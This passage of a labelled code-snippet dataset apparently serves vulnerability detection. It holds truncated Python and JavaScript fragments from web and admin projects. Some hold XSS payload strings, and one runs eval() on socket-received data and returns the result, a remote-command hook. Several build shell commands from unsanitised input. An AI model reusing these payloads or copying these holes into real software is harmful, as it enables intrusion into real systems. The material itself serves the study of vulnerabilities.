1}, {"snippet_id": 54536, "code": " class Meta: model=Article fields=['title', 'category', 'content'] class CommentForm(forms.ModelForm): class Meta: model=Comment fields=['content'] class UserDetail(DetailView): model=User template_name", "label": 0}, {"snippet_id": 27573, "code": " is from a cron job.\"\"\" return bool(self.request.headers.get('X-Appengine-Cron')) def render_forbidden(self, message): \"\"\"Write HTML response for 403.\"\"\" login_url=make_login_url(dest_url=self.request.url", "label": 0}, {"snippet_id": 52149, "code": "': json.dumps(credentials.credentials.keys()), 'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES), 'doc1_id': doc.doc.get().id if doc else -1, 'subworkflows_json': json.dumps(_get_workflows", "label": 1}, {"snippet_id": 8079, "code": "', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\")", "label": 0}, {"snippet_id": 17549, "code": "), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view", "label": 0}, {"snippet_id": 32712, "code": "\">') self.wfile.write(md_fragment) self.wfile.write('</div>') self._WriteTemplate('footer.html') except: raise def _DoRawSourceFile(self, full_path): self._WriteHeader('text/html') self._WriteTemplate(", "label": 0}, {"snippet_id": 2399, "code": " import urlparse import sendrequest as req import utils.logs as logs import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import", "label": 0}, {"snippet_id": 15701, "code": ". \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000", "label": 0}, {"snippet_id": 30433, "code": "\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \tsyslog_server_enable=sql.get_setting('syslog_server_enable') \tif syslog_server_enable is None or syslog_server_enable==\"0\": \t\tlocal_path_logs=sql.get_setting(", "label": 0}, {"snippet_id": 35325, "code": "._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname):", "label": 0}, {"snippet_id": 18416, "code": "', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 23742, "code": ").format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss", "label": 0}, {"snippet_id": 37951, "code": " not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self", "label": 0}, {"snippet_id": 41740, "code": "\"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self ", "label": 0}, {"snippet_id": 10937, "code": " bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. ", "label": 0}, {"snippet_id": 47632, "code": "(\"Rights: \")) f.add_content(NumberField(name=\"rights\", button_text=str(0), minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre", "label": 0}, {"snippet_id": 28641, "code": "): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_uuid=cookie.get('uuid') \tref=os.environ.get(\"SCRIPT_NAME\") \tsql.delete_old_uuid() \t \tif user_uuid", "label": 0}, {"snippet_id": 30316, "code": ".get_setting('stats_page') \ttry: \t\tresponse=requests.get('http://%s:%s/%s' %(serv, stats_port, stats_page), auth=(haproxy_user, haproxy_pass)) \texcept requests.exceptions.ConnectTimeout: \t\tprint('Oops.", "label": 0}, {"snippet_id": 14805, "code": ".env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 4909, "code": ":alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>", "label": 0}, {"snippet_id": 13371, "code": "'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-", "label": 0}, {"snippet_id": 30585, "code": "\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if form", "label": 0}, {"snippet_id": 45088, "code": ", detail) LOG.error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}", "label": 0}, {"snippet_id": 12070, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name", "label": 0}, {"snippet_id": 28237, "code": ".getvalue('config') \toldcfg=form.getvalue('oldconfig') \tsave=form.getvalue('save') \taftersave=1 \ttry: \t\twith open(cfg, \"a\") as conf: \t\t\tconf.write(config) \texcept IOError: \t\terror=\"Can't read import config", "label": 0}, {"snippet_id": 14659, "code": " self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec", "label": 0}, {"snippet_id": 6681, "code": " signup_link(self): \"\"\" URL(string) for use in simple templating of login.html. \"\"\" return self.config.get(self.section, 'signup_link') @property def dashboard_link(self): \"\"\" URL(string) for use in simple", "label": 0}, {"snippet_id": 54052, "code": "%d/%m/%Y %H:%M:%S\"))) crl=[target.get()] if crawl.get()=='On': crl+=bane.crawl(target.get(),bypass=True) pr=proxy.get() if len(pr)==0: pr=None if method.get()==\"GET\": get=True post=False elif method.get", "label": 0}, {"snippet_id": 32821, "code": "._WriteTemplate(template) def _DoNotFound(self): self._WriteHeader('text/html', status_code=404) self.wfile.write('<html><body>%s not found</body></html>' % self.path) def _DoUnknown(self): self._WriteHeader(", "label": 0}, {"snippet_id": 3906, "code": ", \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record", "label": 0}, {"snippet_id": 3043, "code": ".logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split", "label": 0}, {"snippet_id": 4074, "code": ".headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload", "label": 0}, {"snippet_id": 29192, "code": "\tif stderr is None: \t\tsql.insert_waf_metrics_enable(serv, \"0\") def check_haproxy_version(serv): \timport sql \thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tver=\"\" \tcmd=\"echo 'show info' |nc %s ", "label": 0}, {"snippet_id": 4899, "code": "\", '<<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script", "label": 0}, {"snippet_id": 18009, "code": ": urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern", "label": 0}, {"snippet_id": 18906, "code": "+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url", "label": 0}, {"snippet_id": 19218, "code": ".env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py'", "label": 0}, {"snippet_id": 28068, "code": ", secure=True, overwrite=True) self.render_json({'status': 'success'}) class LogoutHandler(base_handler.Handler): \"\"\"Log out handler.\"\"\" @handler.unsupported_on_local_server @handler.require_csrf_token", "label": 0}, {"snippet_id": 26331, "code": " for country{}'.format(data.get('country'))) self.instance.vat_id_validated=False if self.request and self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking", "label": 0}, {"snippet_id": 11348, "code": "{'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course", "label": 0}, {"snippet_id": 42583, "code": "\t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname", "label": 0}, {"snippet_id": 18710, "code": ": urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses", "label": 0}, {"snippet_id": 11067, "code": " them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format", "label": 0}, {"snippet_id": 43162, "code": ".format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length", "label": 0}, {"snippet_id": 49945, "code": " program. /webclientdata -this url is called by the ajax chat using POST requests(long-polling when necessary) The WebClient resource in this module will handle these requests and act as a gateway to sessions", "label": 0}, {"snippet_id": 52333, "code": "(request): response={'status': -1} workflow=json.loads(request.POST.get('workflow', '{}')) layout=json.loads(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id", "label": 0}, {"snippet_id": 4019, "code": "=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url", "label": 0}, {"snippet_id": 35338, "code": " is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df", "label": 0}, {"snippet_id": 6151, "code": ") _CONFIG_DEFAULTS['pysaml2_config']=os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config']) self.config=ConfigParser.ConfigParser(_CONFIG_DEFAULTS) if not self.config.read([filename]): raise ValueError", "label": 0}, {"snippet_id": 5888, "code": "/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>", "label": 1}, {"snippet_id": 13108, "code": ".user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user", "label": 0}, {"snippet_id": 7387, "code": "=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 20092, "code": "-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"-", "label": 0}, {"snippet_id": 6560, "code": " Get list of tuples with packages and paths to content resources, such as login.html. The expected format in the INI file is content_packages=pkg1:some/path/, pkg2:foo :return: list of(pkg, path) tuples", "label": 0}, {"snippet_id": 11110, "code": " data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store", "label": 0}, {"snippet_id": 12035, "code": "', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url", "label": 0}, {"snippet_id": 20409, "code": " self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect", "label": 0}, {"snippet_id": 36140, "code": "._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self", "label": 0}, {"snippet_id": 49219, "code": "(self): new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if int(c)==self.column_id: if column.startswith(\"-\"): new_query.append(c) else: new_query.append('-{}'.format(c", "label": 0}, {"snippet_id": 45554, "code": "=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2", "label": 0}, {"snippet_id": 24902, "code": "\"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" ", "label": 0}, {"snippet_id": 24281, "code": " try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite", "label": 0}, {"snippet_id": 23102, "code": "]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading", "label": 0}, {"snippet_id": 4146, "code": "(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url", "label": 0}, {"snippet_id": 42382, "code": "\tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self)", "label": 0}, {"snippet_id": 53335, "code": "{ 'bundles': bundles }) @check_document_access_permission() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document", "label": 0}, {"snippet_id": 23318, "code": ".static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>", "label": 0}, {"snippet_id": 13527, "code": "'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'),", "label": 0}, {"snippet_id": 36064, "code": ".is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd", "label": 0}, {"snippet_id": 17297, "code": " 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns", "label": 0}, {"snippet_id": 49119, "code": " def get_add_sort_by(self): if not self.is_ordered(): if self.query_order: return self.get_url_with_query_params({ self.ordering_query_param: '{}.{}'.format(self.column_id, self.query_order) }) else: return", "label": 0}, {"snippet_id": 17304, "code": " url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login'", "label": 0}, {"snippet_id": 35438, "code": ".get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df", "label": 0}, {"snippet_id": 22831, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)", "label": 1}, {"snippet_id": 25383, "code": ".join(rendered_widgets) class NamePartsFormField(forms.MultiValueField): widget=NamePartsWidget def compress(self, data_list) -> dict: data={} data['_scheme']=self.scheme_name for i, value in enumerate", "label": 0}, {"snippet_id": 31138, "code": "+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip+\" \"+kp]) \tfunct.ssh_command(slave,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip+\" \"+kp]", "label": 0}, {"snippet_id": 40696, "code": "\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access", "label": 0}, {"snippet_id": 29928, "code": ") \t \tif not os.path.exists(os.getcwd()+'/keys/'): \t\tos.makedirs(os.getcwd()+'/keys/') \t \tssh_keys=os.path.dirname(os.getcwd())+'/keys/'+name+'.pem' \t \ttry: \t\twith open(ssh_keys, \"w\") as conf: \t\t\tconf.write", "label": 0}, {"snippet_id": 40709, "code": " fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0", "label": 0}, {"snippet_id": 11851, "code": ".html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url", "label": 0}, {"snippet_id": 16514, "code": "'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 49165, "code": " self.get_url_with_query_params({ self.ordering_query_param: '-{}.{}'.format(self.column_id, \".\".join(new_query)) }) else: return self.get_url_with_query_params({ self.ordering_query_param: '{}.{}'.format", "label": 0}, {"snippet_id": 6512, "code": ".config.getint(self.section, 'sso_session_lifetime') @property def sso_session_mongo_uri(self): \"\"\" SSO session MongoDB connection URI(string). See MongoDB documentation for details. If not set, an in-memory", "label": 0}, {"snippet_id": 49912, "code": " of the Evennia website url tree(so the testing website might be located on http://localhost:4001/, whereas the webclient can be found on http://localhost:4001/webclient.) /webclient -this url is handled", "label": 0}, {"snippet_id": 51636, "code": ".get('DB_USER', 'dashboard'), 'PASSWORD': os.environ.get('DB_PASSWORD', 'dashboard'), 'HOST': os.environ.get('DB_HOST', 'mysql'), 'OPTIONS': DATABASE_OPTIONS.get(os.environ.get('DB_ENGINE', 'mysql'),{}", "label": 0}, {"snippet_id": 4353, "code": " super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload)", "label": 1}, {"snippet_id": 51225, "code": "'last_login', 'in_groups') actions=[] @staticmethod def in_groups(obj): value=\"\" for group in obj.groups.all(): value +=group.name return value class GroupAdmin(BaseGroupAdmin, ImportExportModelAdmin):", "label": 0}, {"snippet_id": 15860, "code": "'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key", "label": 0}, {"snippet_id": 16298, "code": ", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 35729, "code": "'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype]", "label": 0}, {"snippet_id": 15003, "code": " aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop", "label": 0}, {"snippet_id": 21785, "code": "[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 35453, "code": " \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t", "label": 0}, {"snippet_id": 49407, "code": "] if selected_value==self.value: return True elif self.value is None: return True return False class SmartFilter(TitleFromModelFieldMixin, object): def __init__(self, model, field, query_params, object_list", "label": 0}, {"snippet_id": 6718, "code": "\"\"\" return self.config.get(self.section, 'password_reset_link') @property def default_language(self): \"\"\" Default language code to use when looking for web pages('en'). \"\"\" return self.config.get(self.section", "label": 0}, {"snippet_id": 40012, "code": ")})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or", "label": 0}, {"snippet_id": 32301, "code": "'http://' +hostname if args.port !=80: origin +=':%s' % args.port print('Listening on %s/' % origin) thread=None if args.file: path=os.path.realpath(args.file) if not path.startswith(top_level): print(", "label": 0}, {"snippet_id": 21058, "code": "=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 30602, "code": " \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if form.getvalue('viewlogs') is not None: \tviewlog=form.getvalue('viewlogs') \tlog_path=funct.get_config_var('main", "label": 0}, {"snippet_id": 42644, "code": "\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname", "label": 0}, {"snippet_id": 23951, "code": "\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml", "label": 0}, {"snippet_id": 24837, "code": ".\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If", "label": 0}, {"snippet_id": 53530, "code": "(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_bundle(request, bundle, mapping) request.info(_('Bundle submitted.')) return redirect(reverse('oozie:list_oozie_bundle", "label": 0}, {"snippet_id": 23880, "code": "( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite", "label": 0}, {"snippet_id": 32419, "code": " passed to \"toc\" extension as an extension option, so we can emulate the way how Gitiles converts header titles to URL anchors. Gitiles' official documentation about the conversion is at: https://gerrit", "label": 0}, {"snippet_id": 39671, "code": ", get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg", "label": 0}, {"snippet_id": 25758, "code": ".CharField( label=q.question, required=q.required, help_text=help_text, widget=forms.Textarea, initial=initial.answer if initial else None, ) elif q.type==Question.TYPE_CHOICE: field=forms.ModelChoiceField(", "label": 0}, {"snippet_id": 15675, "code": "\"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers", "label": 0}, {"snippet_id": 9486, "code": ".add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 24996, "code": "(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\",", "label": 0}, {"snippet_id": 26867, "code": " _url): global xss_attacks global DEBUG if page.find(\"http://\")==0 or page.find(\"https://\")==0: furl=page else: if _url.find(\"https://\")==0: furl=\"https://\" +host +\"/\" +page else: furl=\"http://\" +host ", "label": 0}, {"snippet_id": 839, "code": " from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path", "label": 0}, {"snippet_id": 55164, "code": "], locale) mark_changed_translation(action_status['changed_entities'], locale) if action_status['latest_translation_pk']: Translation.objects.get( pk=action_status['latest_translation_pk'] ).update_latest_translation", "label": 0}, {"snippet_id": 18514, "code": "/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading", "label": 0}, {"snippet_id": 6223, "code": " Something like '/var/log/idp' maybe. \"\"\" res=self.config.get(self.section, 'logdir') if not res: res=None return res @property def logfile(self): \"\"\" Path to application logfile. Something like '/var/log/idp", "label": 0}, {"snippet_id": 49800, "code": "'Connection Established.') `,1000) } catch{} socket.on('getMSG',function(data){ document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black>[\"+data+\"]</font>\"; try{ output=eval(data)+\"\" } catch", "label": 1}, {"snippet_id": 48057, "code": " upload_base_path: str='uploads/' +str(date.today().year) high_res_file_name=upload_base_path +'/HIGHRES_' +ntpath.basename(file.name.replace(\" \", \"_\")) low_res_file_name=upload_base_path +'/LOWRES_' +ntpath", "label": 0}, {"snippet_id": 42734, "code": ".format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t", "label": 0}, {"snippet_id": 29251, "code": "=e \t\tpass \ttry: \t\tsftp=ssh.open_sftp() \t\tfile=sftp.put(file, full_path) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\terror=e \t\tpass \t\t \treturn error \t def upload_and_restart(serv, cfg, **kwargs", "label": 0}, {"snippet_id": 20417, "code": "'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key", "label": 0}, {"snippet_id": 31077, "code": "\t \tos.system(\"rm -f %s\" % script) \tsql.update_server_master(master, slave) \t if form.getvalue('masteradd'): \tmaster=form.getvalue('masteradd') \tslave=form.getvalue('slaveadd') \tinterface=form.getvalue(", "label": 0}, {"snippet_id": 33829, "code": 